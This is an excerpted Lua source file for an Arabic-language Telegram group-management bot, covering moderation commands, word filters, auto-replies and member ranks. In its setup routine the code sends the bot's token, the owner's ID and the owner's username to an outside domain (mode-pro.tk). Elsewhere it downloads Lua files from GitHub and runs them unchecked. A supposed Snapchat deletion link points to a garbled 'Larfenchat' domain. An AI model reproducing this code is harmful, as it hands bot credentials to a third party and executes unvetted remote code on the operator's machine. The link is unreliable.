...
if res ~= 200 then
print('\27[0;31m⊶──────────≺𝙡𝙖𝙧≻───────────⊷ ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⊶──────────≺𝙡𝙖𝙧≻───────────⊷ ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m⊶──────────≺𝙡𝙖𝙧≻───────────⊷ ٴ \n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua Larfen.lua')
end
...
https.request('http://mode-pro.tk/Larfen/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("Larfen", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Larfen
token="]]..database:get(id_server..":token")..[["
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Larfen-TEAM/Files_Larfen/main/File_Bot/commands.lua") 
...
local UserName = (data.username_ or "labban1")
...
local Larfen_Msg = ''  
if msgs < 100 then 
Larfen_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Larfen_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Larfen_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Larfen_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Larfen_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Larfen_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Larfen_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Larfen_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Larfen_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Larfen_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Larfen_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Larfen_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Larfen_Msg = 'رب التفاعل'  
end 
return Larfen_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"𝙡𝙖𝙧𝙛𝙚𝙣 ")  
...
function plugin_Larfen(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Larfen and msg then
pre_msg = plugin.Larfen(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceLarfen(msg,data) -- بداية العمل
if msg then
...
if Devmode(msg) then
local bl = ' 🇸🇦︙اهلا عزيزي آلمـطـور\n 🇸🇦︙آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n 🇸🇦︙تسـتطـيع‌‏ آلتحگم باوامر البوت\n 🇸🇦︙من خلاال الكيبورد خاص بك\n 🇸🇦︙قناة سورس البوت [اضغط هنا](t.me/labban1)'
local keyboard = {
{'الاحصائيات ꙳.'},
{'تعطيل التواصل ꙳.','تفعيل التواصل ꙳.'},
{'ضع اسم للبوت ꙳.','قائمة العام ꙳.','قائمة الكتم العام ꙳.'},
{'꙳. تحديثات سورس fevyousef ꙳.'},
{'المطورين ꙳.','الثانويين ꙳.'},
{'المشتركين ꙳.','القروبات ꙳.'},
...
send(msg.chat_id_, msg.id_,Larfen_Msg) 
return false  
end 
if text then    
...
if text == 'ضع رسالة ستارت ꙳.' and Devmode(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' 🇸🇦︙ارسل لي الرسالة الان')
return false
end
if text == 'حذف رسالة ستارت ꙳.' and Devmode(msg) then 
...
os.execute('rm -rf Larfen.lua')
os.execute('wget https://raw.githubusercontent.com/Yosef-lbban/Larfen/main/Larfen.lua')
send(msg.chat_id_, msg.id_,' 🇸🇦︙تم تحديث السورس \n 🇸🇦︙لديك اخر اصدار لسورس fevyousef\n 🇸🇦︙الاصدار » { v 1.6 }')
dofile('Larfen.lua')  
end
if text == 'الاصدار ꙳.' and Devmode(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' 🇸🇦︙اصدار سورس fevyousef \n 🇸🇦︙الاصدار »{ v 1.6 }')
end
...
if text == 'القروبات ꙳.' and Devmode(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n 🇸🇦︙القروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
-------------
if text == "꙳. تحديثات سورس fevyousef ꙳." and Devmode(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس fevyousef*
...
-----------
if text == ("قائمة العام ꙳.") and Devmode(msg) then
...
if text == ("قائمة الكتم العام ꙳.") and Devmode(msg) then
...
if text == "تنظيف القروبات ꙳." and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'🇸🇦︙عدد القروبات الان » { '..#group..' }'..Larfenk..''..Larfen..'\n🇸🇦︙الان عدد القروبات الحقيقي » { '..sendok..' } قروبات\n')   
end
end
end,nil)
end
...
usertext = '\n 🇸🇦︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'labban1')..')'
status  = '\n 🇸🇦︙تم ترقيته مطور'
...
local Larfen1_Msg = database:get(bot_id.."Larfen1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Larfen1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🇸🇦︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'labban1')..') \n 🇸🇦︙'..Larfen1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Larfen_Msg and not Special(msg) then  
local Larfen_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Larfen_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 🇸🇦︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 🇸🇦︙["..Larfen_Msg.."] \n")
else
send(msg.chat_id_,0," 🇸🇦︙العضو : {["..data.first_name_.."](T.ME/labban1)}\n 🇸🇦︙["..Larfen_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
if text and text:match("^تغير رسالة الاشتراك$") and Devmode(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' 🇸🇦︙حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رسالة الاشتراك ꙳." and Devmode(msg) then  
...
database:sadd(bot_id.."Larfen:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Larfen:blocname"..msg.chat_id_)
...
if name_MRmode then 
names_MRmode = database:smembers(bot_id.."Larfen:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."Larfen:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Larfen:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Larfen:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Larfen:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Larfen:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function mode_mrmode_new(mrmode1,mrmode2)
if mrmode2 and mrmode2.first_name_ then 
if mrmode2.first_name_:match("(.*)"..database:get(bot_id.."Larfen:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Larfen:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrmode_nnn = database:get(bot_id.."Larfen:nump"..msg.chat_id_) or 5
local mrmode_nnn2 = database:get(bot_id.."Larfen:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrmode_nnn2) == tonumber(mrmode_nnn) or tonumber(mrmode_nnn2) > tonumber(mrmode_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Larfen:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "🇸🇦︙عزيزي >>["..mrmode2.username_.."](https://t.me/"..(mrmode2.username_ or "labban1")..")\n🇸🇦︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Larfen:teh"..msg.chat_id_).."} بجانب اسمك\n🇸🇦︙عدد المحاولات المتبقيه {"..(tonumber(mrmode_nnn) - tonumber(mrmode_nnn2)).."}")
end
end
end
end
...
local LarfenChengName = database:get(bot_id.."Larfen:Cheng:Name"..data.id_)
if not data.first_name_ then 
if LarfenChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..LarfenChengName..']')
database:del(bot_id.."Larfen:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if LarfenChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Larfen:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local LarfenChengUserName = database:get(bot_id.."Larfen:Cheng:UserName"..data.id_)
if not data.username_ then 
if LarfenChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..LarfenChengUserName..']')
database:del(bot_id.."Larfen:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if LarfenChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Larfen:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local LarfenChengPhoto = database:get(bot_id.."Larfen:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if LarfenChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Larfen:Cheng:Photo"..data.id_) 
end
end
...
database:set(bot_id.."Larfen:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 🇸🇦︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'labban1')..') \n 🇸🇦︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if text == ("مسح قائمة العام") and Devmode(msg) then
...
local UserName = (b.username_ or "Larfen-TEAM")
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Larfen, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Larfen, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 🇸🇦︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'labban1')..')'
status  = '\n 🇸🇦︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 🇸🇦︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 🇸🇦︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'labban1')..')'
...
database:set(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," 🇸🇦︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Larfen1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Larfen1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," 🇸🇦︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Larfen1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Larfen1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Larfen1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," 🇸🇦︙ارسل الكلمه الان")  
database:set(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Larfen1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Larfen1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Larfen1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Larfen1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Larfen1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Larfen1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n 🇸🇦︙قائمة المنع \n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n"
for k,v in pairs(list) do  
local Larfen_Msg = database:get(bot_id.."Larfen1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Larfen_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'مسح رسالة المطور' and Devmode(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' 🇸🇦︙تم مسح رسالة المطور')
end
if text == 'ضع رسالة المطور' and Devmode(msg) then
...
if text == 'مسح المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
...
send(msg.chat_id_, msg.id_,' 🇸🇦︙تم مسح المحذوفين')
end,nil)
end
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 🇸🇦︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'labban1')..')'..'\n 🇸🇦︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'fevyousef').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'fevyousef')
local Larfen_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..Larfen_Msg[math.random(#Larfen_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n 🇸🇦︙ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:Larfen:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:Larfen:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Larfen:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"🇸🇦︙تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:Larfen:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:Larfen:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:Larfen:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:Larfen:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:Larfen:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:Larfen:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:Larfen:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:Larfen:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:Larfen:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:Larfen:List:Rd:Sudo")
end
...
database:set(bot_id.."labban1:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'꙳. تم تفعيل الانستا')
database:set(bot_id.."labban1:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."labban1:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."labban1:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"🇸🇦︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."labban1:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."labban1:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس fevyousef يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:Larfen:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"🇸🇦︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:Larfen:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Larfen:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Larfen:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Larfen:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Larfen:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:Larfen:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Larfen:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:Larfen:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:Larfen:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:Larfen:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'fevyousef').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'labban1')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
Larfendx(msg.chat_id_, msg.id_, ' 🇸🇦︙ايدي المجموعة » ( '..msg.chat_id_..' )\n 🇸🇦︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n 🇸🇦︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n 🇸🇦︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_,"مرحبا . اكتب `الاوامر` وتحكم في الكيبورد المنشورات")
return false
end
...
if text == "00000" or text == "0000" or text == "بوسي" or text == "مصي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح💋","مابوس ولي😌😹","خدك/ج نضيف 😂","ال0000 بالف حمبي 🌝💋","خلي يزحفلي وا0000 🙊😻","كل شويه ا0000 كافي 😏","ماا0000 والله هذا زاحف🦎","محح هاي لحاته صاكه💋"}send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
≪─━─━─𝙎𝙉━─━─≫
 ...
 ꙳. رابط حذف [Snspchat](https://accounts.Larfenchat.com/accounts/login?continue=https%3A%2F%2Faccounts.Larfenchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'fevyousef')
...
Larfen = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Larfen)
...
--------------------------------------------------------------------------------------------------------------
SourceLarfen(data.message_,data)
plugin_Larfen(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local LarfenAbot = database:get(bot_id.."Larfen1:Add:Filter:Rp2"..text..result.chat_id_)   
if LarfenAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 🇸🇦︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 🇸🇦︙["..LarfenAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Larfen1_Msg = database:get(bot_id.."Larfen1:Add:Filter:Rp2"..text..result.chat_id_)   
if Larfen1_Msg then    
send(msg.chat_id_, msg.id_," 🇸🇦︙"..Larfen1_Msg)
